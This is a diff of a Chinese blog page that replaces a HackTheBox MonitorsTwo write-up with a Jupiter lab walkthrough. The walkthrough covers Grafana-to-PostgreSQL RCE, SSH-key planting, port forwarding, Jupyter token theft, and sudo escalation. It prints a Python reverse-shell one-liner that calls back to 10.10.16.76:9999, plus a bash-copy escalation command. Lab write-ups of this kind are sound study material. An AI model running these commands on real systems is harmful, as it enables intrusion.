@@ -16,48 +16,69 @@
   <meta name="author" content="Aurey7">
   <meta name="keywords" content="">
   
-    <meta name="description" content="端口还没扫完，直接浏览器访问一下，Google一搜，RCE  CVE-2022-46169-CACTI-1.2.22 直接拿下   Get User Flag但是www-data用户连家目录都无，这里没有找到user flag 直接上Linpeas 收集一下信息，发现了一个脚本 entrypoint.sh和两个数据库密码   这里也是一个连接数据库的脚本，倒是发现了有个host为db的数据库  d">
+    <meta name="description" content="年轻人的第一台Medium靶机，没想到这么逆天 开局先扫描  体验功能很漂亮的页面  主页翻了半天什么都没有，目录、js接口什么都找不到。实在没办法去看了一下writeup 虚拟主机扫描使用gobuster vhost爆破到了kiosk.jupiter.htb虚拟主机名，算是学到新姿势了  一个Grafana&amp;#x20;  使用API执行SQL语句（这还是Google找到的，国内都是分享某个漏洞）">
 <meta property="og:type" content="article">
-<meta property="og:title" content="MonitorsTwo - HackTheBox">
-<meta property="og:url" content="http://aurey7.github.io.git/2023/07/16/MonitorsTwo-HackTheBox/index.html">
+<meta property="og:title" content="Jupiter - HackTheBox">
+<meta property="og:url" content="http://aurey7.github.io.git/2023/07/18/Jupiter-HackTheBox/index.html">
 <meta property="og:site_name" content="Aurey7&#39;s Blog">
-<meta property="og:description" content="端口还没扫完，直接浏览器访问一下，Google一搜，RCE  CVE-2022-46169-CACTI-1.2.22 直接拿下   Get User Flag但是www-data用户连家目录都无，这里没有找到user flag 直接上Linpeas 收集一下信息，发现了一个脚本 entrypoint.sh和两个数据库密码   这里也是一个连接数据库的脚本，倒是发现了有个host为db的数据库  d">
+<meta property="og:description" content="年轻人的第一台Medium靶机，没想到这么逆天 开局先扫描  体验功能很漂亮的页面  主页翻了半天什么都没有，目录、js接口什么都找不到。实在没办法去看了一下writeup 虚拟主机扫描使用gobuster vhost爆破到了kiosk.jupiter.htb虚拟主机名，算是学到新姿势了  一个Grafana&amp;#x20;  使用API执行SQL语句（这还是Google找到的，国内都是分享某个漏洞）">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Q6F88cIx3M.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_vlWca8mr7s.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_bnxOO6aQgw.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_NQThyjlhnm.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_t7OuKTMMe5.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_JNh6xed6cX.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_9IMi2gGAqP.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_8zDCX02DIY.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_8i6wujwPhZ.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_H3B7f1i3PQ.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_MBtQQHdVmg.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_xhl4G00v7d.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_ggdaCi7uMz.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_gMjX2tx9ck.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_E2jbbHVlqA.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Wz-LAKfkiI.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_s1KagKh6AJ.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_7P_NAmATET.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_8VoeEON5zC.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_aQYhSIoU6I.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_dRVimB8E8u.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_CiVOFKRHht.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_zL_9eQzyj8.png">
-<meta property="article:published_time" content="2023-07-16T02:35:21.000Z">
-<meta property="article:modified_time" content="2023-07-16T02:37:17.368Z">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_dFWdzTPsfA.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_LE8jgMM2m3.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image__JojbIIcXD.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_OoJTVk8IMy.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_qkUEi3Ct-P.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_n2RS9v0OEw.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_VHMTzmoQWH.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_JTsMmB1RUj.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_L7hs3nx1mL.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_ur2AveS-BM.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_ixPaGBJpTp.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_jVr_y52xbe.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_0-RM-2GSip.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_-CbluHyD9r.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_TMLnDluvHe.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_hr6VPekhTL.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_dmIOcuwQpl.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_6GsKGo9rG3.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_gVhKvuN2pc.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_kMD6EKET4R.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_r_Lfxl6TXk.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_cJrI2qkaDg.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_990DP69Aqq.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_gLsTUXn2jg.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_gZguUUq3QC.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_YRctifwFk3.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Wj6n1DHgC9.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_aAx83pgF9E.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_p7vfDE27bY.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_U0Y9ZBcli9.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_5DJxf9v0jf.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_EAOEoEe7YG.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_-iruoxmxss.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_SXgQnoh2jC.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_GcMV3rK-pg.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_3T22lTH-O9.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_PUti8NGbiu.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_4Pz7xB-tUP.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_CauIjEU8d4.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_7Kj00JOFDl.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_HDiUE-9v9E.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_W7FS4heVMt.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Rme1oSXEWw.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_vjsWQXlpIr.png">
+<meta property="article:published_time" content="2023-07-18T15:05:34.000Z">
+<meta property="article:modified_time" content="2023-07-18T15:06:58.118Z">
 <meta property="article:author" content="Aurey7">
 <meta property="article:tag" content="HackTheBox">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Q6F88cIx3M.png">
+<meta name="twitter:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_dFWdzTPsfA.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>MonitorsTwo - HackTheBox - Aurey7&#39;s Blog</title>
+  <title>Jupiter - HackTheBox - Aurey7&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -235,7 +256,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="MonitorsTwo - HackTheBox"></span>
+            <span id="subtitle" data-typed-text="Jupiter - HackTheBox"></span>
           
         </div>
 
@@ -246,8 +267,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-07-16 10:35" pubdate>
-          2023年7月16日 上午
+        <time datetime="2023-07-18 23:05" pubdate>
+          2023年7月18日 晚上
         </time>
       </span>
     
@@ -258,7 +279,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          840 字
+          2k 字
         
       </span>
     
@@ -269,7 +290,7 @@
         
         
         
-          8 分钟
+          18 分钟
         
       </span>
     
@@ -315,59 +336,109 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">MonitorsTwo - HackTheBox</h1>
+            <h1 style="display: none">Jupiter - HackTheBox</h1>
             
             
               <div class="markdown-body">
                 
-                <p>端口还没扫完，直接浏览器访问一下，Google一搜，RCE</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Q6F88cIx3M.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<h3 id="CVE-2022-46169-CACTI-1-2-22"><a href="#CVE-2022-46169-CACTI-1-2-22" class="headerlink" title="CVE-2022-46169-CACTI-1.2.22"></a>CVE-2022-46169-CACTI-1.2.22</h3><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_vlWca8mr7s.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>直接拿下</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_bnxOO6aQgw.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_NQThyjlhnm.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<h3 id="Get-User-Flag"><a href="#Get-User-Flag" class="headerlink" title="Get User Flag"></a>Get User Flag</h3><p>但是www-data用户连家目录都无，这里没有找到user flag</p>
-<p>直接上Linpeas 收集一下信息，发现了一个脚本 <code>entrypoint.sh</code>和两个数据库密码</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_t7OuKTMMe5.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_JNh6xed6cX.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>这里也是一个连接数据库的脚本，倒是发现了有个host为db的数据库</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_9IMi2gGAqP.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>db的地址找不到，不过有个<code>172.19.0.3</code>，我们可以尝试连接</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_8zDCX02DIY.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>结果就是失败了</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_8i6wujwPhZ.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>这里是在没办法了，去网上找了一下writeup，发现大伙使用 <code>getent</code>发现的数据库地址</p>
-<blockquote>
-<p><code>getent</code> 命令用来查看系统的数据库中的相关记录。即使这些数据库不是在本地，比如 ldap 或者 nis 中的数据库，也可以使用 getent 查看。</p>
-</blockquote>
-<h4 id="Docker-逃逸"><a href="#Docker-逃逸" class="headerlink" title="Docker 逃逸"></a>Docker 逃逸</h4><p>登录MySQL成功，本来想在mysql.user里面查信息的，结果Password这一列直接被删。于是转战cacti</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_H3B7f1i3PQ.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>使用john爆破一下，得出明文密码</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_MBtQQHdVmg.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>拿下User Flag</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_xhl4G00v7d.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<h3 id="Get-Root-Flag"><a href="#Get-Root-Flag" class="headerlink" title="Get Root Flag"></a>Get Root Flag</h3><p>SUID和sudo看了一下是没有了，直接上linpeas再查查</p>
-<p>倒是发现了个at提权漏洞</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_ggdaCi7uMz.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_gMjX2tx9ck.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>结果环境里就没有安装gcc…</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_E2jbbHVlqA.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>又在linpeas里面翻了很久，根据里面的信息可以察觉到这里和CACTI（上面那个Shell）应该是两个机器，根据进程信息可以判断这边应该跑着Docker，CACTI可能就是个容器</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Wz-LAKfkiI.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>于是查一下Docker版本看看有没有nday</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_s1KagKh6AJ.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>还真有，该漏洞允许非特权Linux用户访问和运行容器内的程序。</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_7P_NAmATET.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>找到EXP直接开冲：<a target="_blank" rel="noopener" href="https://github.com/UncleJ4ck/CVE-2021-41091" title="https://github.com/UncleJ4ck/CVE-2021-41091">https://github.com/UncleJ4ck/CVE-2021-41091</a></p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_8VoeEON5zC.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>但是跑完之后还是没成功嘛，认真看一下，我们需要先在容器内给<code>/bin/bash</code> 加上SUID</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_aQYhSIoU6I.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>又回到CACTI里面提权，SUID这里发现了<code>capsh</code>可以进行提权</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_dRVimB8E8u.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_CiVOFKRHht.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>再回去试试</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_zL_9eQzyj8.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>拿下！这台靶机，开局直接送个Shell，我还在想这也太简单了。结果是个Container环境，还得Docker逃逸，整体还是挺有收获的</p>
+                <p>年轻人的第一台Medium靶机，没想到这么逆天</p>
+<p>开局先扫描</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_dFWdzTPsfA.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<h3 id="体验功能"><a href="#体验功能" class="headerlink" title="体验功能"></a>体验功能</h3><p>很漂亮的页面</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_LE8jgMM2m3.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>主页翻了半天什么都没有，目录、js接口什么都找不到。实在没办法去看了一下writeup</p>
+<h3 id="虚拟主机扫描"><a href="#虚拟主机扫描" class="headerlink" title="虚拟主机扫描"></a>虚拟主机扫描</h3><p>使用gobuster vhost爆破到了<code>kiosk.jupiter.htb</code>虚拟主机名，算是学到新姿势了</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image__JojbIIcXD.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>一个Grafana&#x20;</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_OoJTVk8IMy.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>使用API执行SQL语句（这还是Google找到的，国内都是分享某个漏洞）</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_qkUEi3Ct-P.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<h3 id="PostgreSQL-RCE"><a href="#PostgreSQL-RCE" class="headerlink" title="PostgreSQL RCE"></a>PostgreSQL RCE</h3><p>可以执行postgres SQL了，进一步利用参考</p>
+<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql#rce">https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql#rce</a></p>
+<p>直接试试RCE</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_n2RS9v0OEw.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_VHMTzmoQWH.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>拿下 （本以为可以开始提权了就可以美滋滋拿下一台Medium靶机了，没想到这才是噩梦的开始</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_JTsMmB1RUj.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<h3 id="Get-User-Flag"><a href="#Get-User-Flag" class="headerlink" title="Get User Flag"></a>Get User Flag</h3><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_L7hs3nx1mL.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>PEASS找到了一些信息但没法直接提权，用pspy看一下进程试试</p>
+<p>可以看到jovian有在运行jupyter</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_ur2AveS-BM.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>juno会运行<code>/home/juno/shadow-simulation.sh</code> 和</p>
+<p><code>/home/juno/.local/bin/shadow /dev/shm/network-simulation.yml</code></p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_ixPaGBJpTp.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>查了一下shadow命令是用来管理密码的，我们看看<code>/dev/shm/network-simulation.yml</code>是什么内容</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_jVr_y52xbe.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>感觉是个CS架构的脚本，python开个服务端，curl作为客户端去请求</p>
+<p>进程中也是这样</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_0-RM-2GSip.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>脚本由juno执行，拥有它的权限，我直接写一手公钥，实现免密登录</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_-CbluHyD9r.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_TMLnDluvHe.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>记得给<code>/tmp/test</code>打上777权限，以防juno没权限。静待片刻，就可以免密登录了</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_hr6VPekhTL.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>终于拿下User Flag</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_dmIOcuwQpl.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>脚本里的内容跟我们在进程里看到的一致</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_6GsKGo9rG3.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<h3 id="Get-Root-Flag"><a href="#Get-Root-Flag" class="headerlink" title="Get Root Flag"></a>Get Root Flag</h3><p>进程信息发现jovian开了jupyter-notebook跑脚本<code>/opt/solar-flares/flares.ipynb</code></p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_gVhKvuN2pc.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>PATH这里似乎有得利用</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_kMD6EKET4R.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>端口开了不少</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_r_Lfxl6TXk.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>这里显示我们可以修改<code>/opt/solar-flares</code>下的一些文件，还记得jovian用户执行的Jupyter文件吗，可惜我们不能直接改那个脚本</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_cJrI2qkaDg.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>上面开了挺多端口，外部都访问不到。我们这里考虑整个隧道进去</p>
+<h4 id="两层端口转发"><a href="#两层端口转发" class="headerlink" title="两层端口转发"></a>两层端口转发</h4><p>VPS上将靶机的3000端口转发到VPS的3000端口上</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_990DP69Aqq.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>本地将VPS的3000端口转发到本地的3000端口上</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_gLsTUXn2jg.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>即可通过本地访问到靶机中的<code>127.0.0.1:3000</code>，这里还是那个Grafana，我看看8888是什么</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_gZguUUq3QC.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>8888是一台Jupyter</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_YRctifwFk3.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>参考一下exploit-notes，我们可以找到token直接登录Jupyter，然后Jupyter的控制台可以执行命令，通过之前的进程可以看到这是jovian在跑的，拿下它就可以拿到jovian的权限了</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Wj6n1DHgC9.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><a target="_blank" rel="noopener" href="https://exploit-notes.hdks.org/exploit/machine-learning/jupyter-notebook-pentesting/">https://exploit-notes.hdks.org/exploit/machine-learning/jupyter-notebook-pentesting/</a></p>
+<p>一手grep拿下token</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_aAx83pgF9E.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>利用ipynb反弹shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">import socket,os,pty;s=socket.socket();s.connect((&quot;<span class="hljs-number">10.10</span>.<span class="hljs-number">16.76</span>&quot;, <span class="hljs-number">9999</span>));[os.dup2(s.fileno(),fd) <span class="hljs-keyword">for</span> fd <span class="hljs-keyword">in</span> (0,1,2)];pty.spawn(<span class="hljs-string">&quot;bash&quot;</span>)<br></code></pre></td></tr></table></figure>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_p7vfDE27bY.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>看到这里允许sudo，我并没有密码，希望是个免密sudo</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_U0Y9ZBcli9.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>非常nice</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_5DJxf9v0jf.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>执行一下发现提示我们没有配置文件</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_EAOEoEe7YG.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>但是没用过sattrack这个工具，没有文档看</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_-iruoxmxss.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>上网搜了一下，其他地方啥都搜不到，只能看这篇论文了。我是真没想到打个靶机还得看论文…</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_SXgQnoh2jC.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>论文里也是一顿介绍，只能知道这是一个卫星轨道预测和实时跟踪程序，并没有具体的用法和命令。</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_GcMV3rK-pg.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>只能发挥一下CTF余热，strings一下看看能不能发现什么</p>
+<p><code>/tmp/config.json</code>不存在，有可能就是sattrack想要的配置文件</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_3T22lTH-O9.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_PUti8NGbiu.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>我们创建一个再执行命令，确实现在没有提示找不到配置文件了</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_4Pz7xB-tUP.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>但是这配置文件还是不知道怎么写，后面想起<code>/usr/local/share</code>一般会放一些配置案例</p>
+<p>直接find开找</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_CauIjEU8d4.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_7Kj00JOFDl.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>复制过来执行一下，这里似乎会去下载tlesources指定的文件。</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_HDiUE-9v9E.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>试一下把tlesources改成flag的地址</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_W7FS4heVMt.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>终于拿下了</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Rme1oSXEWw.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<h4 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h4><p>太折磨了，主要也是我打得断断续续的（每天下班时间打一下，公司一下又断开回家打）。这波打下来还是学到很多的（虚拟主机扫描、通过Grafana 打PostgreSQL GetShell、用户定时任务脚本提权、两层端口转发打内网服务、恶心的没用过的软件提权）</p>
+<p>而且这个sattrack提权还没有writeup，大伙都是有<code>/usr/local/bin/sattrack</code>读写权限，直接</p>
+<p><code>cp /bin/bash /usr/local/bin/sattrack</code>再<code>sudo /bin/bash</code>就完事了 😓</p>
+<p>最后，狠狠的给他打个8分（虽然我还没打过Hard</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_vjsWQXlpIr.png" srcset="/img/loading.gif" lazyload alt=""></p>
 
                 
               </div>
@@ -392,8 +463,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
